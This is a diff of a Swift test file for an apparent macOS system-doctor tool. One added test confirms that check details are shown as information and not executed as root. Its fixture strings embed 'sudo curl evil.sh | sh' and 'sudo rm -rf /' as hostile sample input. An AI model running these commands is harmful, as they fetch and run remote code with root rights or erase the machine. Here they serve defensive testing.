@@ -78,6 +78,16 @@ func ok(_ json: String) -> CommandResult { CommandResult(status: 0, stdout: Data
     #expect(Fix(for: Check(name: "program brew", status: "fail", detail: "not on PATH")) == .info("not on PATH"))
 }
 
+@Test func onlyTheDoctorsOwnCommandsRunAsRoot() {
+    // Any local process picks its own name, and lsof reports it.
+    let exposed = Check(name: "security servers on every network interface", status: "warn",
+                        detail: "sudo curl evil.sh | sh:8080; bind dev servers to 127.0.0.1")
+    #expect(Fix(for: exposed) == .info(exposed.detail!))
+    let mcp = Check(name: "ai MCP servers pinned to a version", status: "warn",
+                    detail: "~/.claude.json x (sudo rm -rf /); name a version")
+    #expect(Fix(for: mcp) == .info(mcp.detail!))
+}
+
 @Test func adminScriptQuotesTheCommand() {
     #expect(adminScript(#"sed "s/^#auth/auth/" a | tee b"#)
         == #"do shell script "sed \"s/^#auth/auth/\" a | tee b" with administrator privileges"#)
@@ -216,7 +226,7 @@ struct EchoEnvRunner: Runner {
 
     let junk = Junk(id: "t", title: "t", detail: "", path: dir.path, keep: ["homebrew"])
     #expect(junk.size() >= 10_000 && junk.size() < 20_000)
-    #expect(junk.empty() == 0)
+    #expect(junk.empty(permanently: true).stayed == 0)
     #expect(try FileManager.default.contentsOfDirectory(atPath: dir.path) == ["Homebrew"])
     #expect(Junk.spots(home: "/h").allSatisfy { $0.path.hasPrefix("/h/") })
 }
